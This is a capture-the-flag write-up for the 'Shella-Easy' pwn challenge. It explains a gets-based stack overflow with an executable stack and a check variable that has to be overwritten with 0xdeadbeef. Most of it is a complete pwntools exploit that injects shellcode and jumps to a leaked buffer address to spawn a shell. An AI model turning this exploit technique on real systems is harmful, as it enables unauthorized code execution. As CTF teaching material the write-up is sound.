# Shella-Easy (pwn)

![image](https://github.com/AndreQuimper/Writeups/assets/96965806/19dc4965-f4e9-4930-8bb6-ef6a02bc1f89)  

If we run the program we get the following output  
![image](https://github.com/AndreQuimper/Writeups/assets/96965806/0f9b9140-7703-4e2b-9198-9921dc1a28f8)  

This seems to be pretty similar to [pilot](./csaw17_pilot.md), but we won't be sure until we look at the binary.  
A wise man once told me "Even if you have the source code, only the binary holds the truth".  
Ghidra shows the following  
![image](https://github.com/AndreQuimper/Writeups/assets/96965806/c49d0218-4f52-43ad-b271-facb0b86f485)  

We can see the use of gets, which in conjunction with no NX bit, means that we can utilize shellcode to exploit this binary.  
There is a tiny inconvenience however, there is a check for `local_c` to ensure that it is equal to a specific value.  
So when overwriting we have to ensure that we overwrite `local_c` with the correct value.  

## Exploitation  
Since we can't just throw `cyclic()` at the binary and figure out at which offset the return address is, we first need to make sure we can overwrite `local_c` with the correct value.  

![image](https://github.com/AndreQuimper/Writeups/assets/96965806/5d86c303-f437-4849-b52c-b6fb19da3c2f)  
Looking at the stack layout in Ghidra we can see that the buffer and `local_c` are contiguous, so we can just fill the buffer and the next data will be `local_c`.  
Once we get that working we can continue as usual, using `cyclic()` to figure out the offset from there, and then overwrite the return address with the beginning of our buffer.  

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template shella-easy
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'shella-easy')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR



def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     i386-32-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX unknown - GNU_STACK missing
# PIE:      No PIE (0x8048000)
# Stack:    Executable
# RWX:      Has RWX segments

io = start()

shellcode = asm(shellcraft.sh())

io.recvuntil(b'have a ')

addr = int(io.recv(10),16)

padding = (64-len(shellcode))*b'A'

io.sendline(shellcode + padding + p32(0xdeadbeef) + b'B'*8 + p32(addr))

io.interactive()
```

![image](https://github.com/AndreQuimper/Writeups/assets/96965806/0fa24d54-e80d-4779-afd8-f3e85374976b)



